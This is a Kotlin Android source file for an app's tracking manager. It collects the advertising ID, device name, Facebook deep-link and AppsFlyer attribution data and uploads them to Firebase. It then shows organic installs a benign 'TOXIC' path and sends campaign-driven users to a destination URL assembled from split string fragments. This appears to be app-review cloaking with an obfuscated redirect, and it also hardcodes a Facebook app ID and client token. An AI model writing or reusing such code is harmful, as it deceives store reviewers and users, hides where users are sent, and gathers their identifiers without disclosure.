package wiz.lucky.razorreturn.ui.theme.data

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.database.FirebaseDatabase
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import wiz.lucky.razorreturn.App
import wiz.lucky.razorreturn.Const
import wiz.lucky.razorreturn.RazorViewModel
import java.util.Calendar
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class TrackManager(private val context: Context, private val vm: RazorViewModel) {

    private val appsDevKey = App.APPSDEVKEY1+App.APPSDEVKEY2
    private val sp = context.getSharedPreferences(Const.SP, Context.MODE_PRIVATE)


    suspend fun initManager(){

        Log.d("123123", "init manager")

        val facebook = provideFacebook()

        Log.d("123123", "FB response $facebook")

        val google = provideGadid()

        Log.d("123123", "Google response $google")

        val apps = provideApps()
        Log.d("123123", "Apps response $apps")


        sp.edit().putString(Const.GAID, google).apply()

        val DEVICE_NAME = Settings.Global.getString(context.contentResolver, Settings.Global.DEVICE_NAME)
        val fireBaseDB = FirebaseDatabase.getInstance()
        val data = "Gaid: $google, fb: $facebook apps $apps"
        val currentDate = Calendar.getInstance().time
        val ref = fireBaseDB.getReference("$DEVICE_NAME TrackManager $currentDate")
        ref.setValue(data)

        val listOfFacebookSubs : List<String> = facebook.substringAfter("://")
            .split('_')
            .filter { it.startsWith("sub") }
            .map { it.substringAfter("=") }

        val sub2 = if (listOfFacebookSubs.getOrNull(1) != null) listOfFacebookSubs.getOrNull(1) else "LGxfTPfW"
        val sub1 = listOfFacebookSubs.getOrNull(0) ?: "null"


        val list = listOf("http", "s://ft", "-apps.com/")
        OneSignal.setExternalUserId(google)
        OneSignal.sendTag("sub1", sub1)

        if (apps?.get(Const.AF_STATUS) == "Organic" && sub1 == "null"){

            Log.d("123123",  "1st case AF_STATUS is ${apps?.get(Const.AF_STATUS)} sub1 is $sub1")

            vm.addDataToFlow(Const.TOXIC)
            sp.edit().putString(Const.STATUS, Const.TOXIC).apply()
        } else if (apps?.get(Const.AF_STATUS) != "Organic" && sub2 == "LGxfTPfW"){

            Log.d("123123", "2nd case AF_STATUS is ${apps?.get(Const.AF_STATUS)} sub1 is $sub1")

            val linkBuilder = StringBuilder(list[0]+list[1]+list[2]+"$sub2")
            val finalDestination = linkBuilder.toString()
            sp.edit().putString(Const.DESTINATION, finalDestination).apply()
            vm.addDataToFlow(Const.FRIEND)

        } else {

            Log.d("123123", "else case AF_STATUS is ${apps?.get(Const.AF_STATUS)} sub1 is $sub1")

            val linkBuilder = StringBuilder(list[0]+list[1]+list[2]+"$sub2?")
            val af_channel: String = apps?.getOrDefault(Const.AF_CHANNEL, "null").toString()
            val adset: String = apps?.getOrDefault(Const.ADSET, "null").toString()
            val media_source: String = apps?.getOrDefault(Const.MEDIA_SOURCE, "null").toString()
            val af_status: String = apps?.getOrDefault(Const.AF_STATUS, "null").toString()
            val af_ad: String = apps?.getOrDefault(Const.AF_AD, "null").toString()
            val campaign_id: String = apps?.getOrDefault(Const.CAMPAIGN_ID, "null").toString()
            val adset_id: String = apps?.getOrDefault(Const.ADSET_ID, "null").toString()
            val ad_id: String = apps?.getOrDefault(Const.AD_ID, "null").toString()

            //Take second sub

            linkBuilder.append("af_channel=$af_channel&")
            linkBuilder.append("adset=$adset&")
            linkBuilder.append("media_source=$media_source&")
            linkBuilder.append("af_status=$af_status&")
            linkBuilder.append("af_ad=$af_ad&")
            linkBuilder.append("campaign_id=$campaign_id&")
            linkBuilder.append("adset_id=$adset_id&")
            linkBuilder.append("ad_id=$ad_id&")
            linkBuilder.append("sub3=${listOfFacebookSubs.getOrNull(2)}&")
            linkBuilder.append("sub4=${listOfFacebookSubs.getOrNull(3)}&")
            linkBuilder.append("sub5=${listOfFacebookSubs.getOrNull(4)}&")
            linkBuilder.append("sub6=${listOfFacebookSubs.getOrNull(5)}&")
            linkBuilder.append("sub7=${listOfFacebookSubs.getOrNull(6)}&")
            linkBuilder.append("sub8=${listOfFacebookSubs.getOrNull(7)}&")
            linkBuilder.append("sub9=${listOfFacebookSubs.getOrNull(8)}&")
            linkBuilder.append("sub10=${listOfFacebookSubs.getOrNull(9)}")

            val finalDestination = linkBuilder.toString()
            sp.edit().putString(Const.DESTINATION, finalDestination).apply()
            vm.addDataToFlow(Const.FRIEND)
        }

        //save final link to the sp
    }

    suspend fun provideApps() : MutableMap<String, Any>? = suspendCoroutine { cont ->
        Log.d("123123", "Ask apps about information")
        AppsFlyerLib.getInstance()
            .init(
                appsDevKey,
                CustomListener {
                       cont.resume(it)
                },
                context
            )
            .start(context)
    }

    private suspend fun provideFacebook() : String = suspendCoroutine{ cont ->
        FacebookSdk.setApplicationId("140903979057173")
        FacebookSdk.setClientToken("ca98a3c02f0e1af5f096a5f9ba147e4b")
        FacebookSdk.sdkInitialize(context)

        AppLinkData.fetchDeferredAppLinkData(context){
            //cont.resume("myapp://sub1=ok_sub2=ok_sub3=ok_sub4=ok_sub5=ok_sub6=ok_sub7=ok_sub8=ok_sub9=ok_sub10=ok")
            cont.resume(it?.targetUri.toString())
        }
    }

    private suspend fun provideGadid() : String = withContext(Dispatchers.IO){
        val gadid = AdvertisingIdClient.getAdvertisingIdInfo(context).id.toString()
        gadid
    }
}

class CustomListener(private val onReceiveValue : (MutableMap<String, Any>?) -> Unit) : AppsFlyerConversionListener{
    override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
        Log.d("123123", "onConversionDataSuccess")
        onReceiveValue(p0)
    }

    override fun onConversionDataFail(p0: String?) {
        Log.d("123123", "onConversionDataFail")
        onReceiveValue(null)
    }

    override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
        Log.d("123123", "onAppOpenAttribution")
        onReceiveValue(null)
    }

    override fun onAttributionFailure(p0: String?) {
        Log.d("123123", "onAttributionFailure")
        onReceiveValue(null)
    }
}